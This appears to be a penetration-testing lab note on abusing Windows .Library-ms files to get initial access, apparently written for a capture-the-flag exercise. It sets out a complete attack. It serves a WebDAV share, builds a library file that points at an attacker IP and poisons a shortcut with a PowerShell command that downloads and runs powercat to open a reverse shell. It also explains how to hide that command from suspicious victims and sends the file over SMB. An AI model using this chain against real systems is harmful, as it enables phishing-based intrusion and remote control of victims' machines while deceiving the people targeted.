#### Abusing Windows Library Files






		Many security products scan for malicious macros and many end users are trained not to use them. Windows library files can be equally effectively abused.
		
		Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a 
		.Library-ms extension and can be executed by double clicking in Explorer.
		
		A two-stage attack is possible by first using WIndows library files to gain a foothold on the 
		target and set up the second stage by creating an .exe and leaving it on the device.
		
		In this attack, the Windows library file will connect to a WebDAV share. The victim must 
		open the WebDAV directory via double-clicking, then the directory will contain a .lnk file
		that has been poisoned with a PowerShell reverse shell. This two-step method circumvents 
		the common security control of analyzing all weblinks and filtering out the link if it were hosted directly on an evil server.
		
		Library files consist of three major parts and are written in XML. 
			-General Library Info
			-Library Props
			-Library Locations
		
		Library Description Schema has more info on the construction of a library file.
		
		
		The Attack
		
		pip3 install wsgidav
		
		mkdir /tmp/webdav/
		
		/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /tmp/webdav/
		
		
		
		Craft a library file:
		
			<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">



	<name>@windows.storage.dll,-34582</name>
<version>6</version>
		
		<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>

<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>

<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.215</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>

</libraryDescription>

Create a poisonous link:


powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.215:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"

Hint:
If we expect that our victims are tech-savvy enough to actuallycheck where the shortcut files are pointing, we can use a handy trick.Since our provided command looks very suspicious, we could just put adelimiter and benign command behind it to push the malicious commandout of the visible area in the file's property menu. If a user wereto check the shortcut, they would only see the benign command.

Send the file via email, etc.

This time we will send via SMB:

smbclient //192.168.215.195/share -c 'put config.Library-ms'

To find the flag:
PS D:\Temp> Get-ChildItem -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue




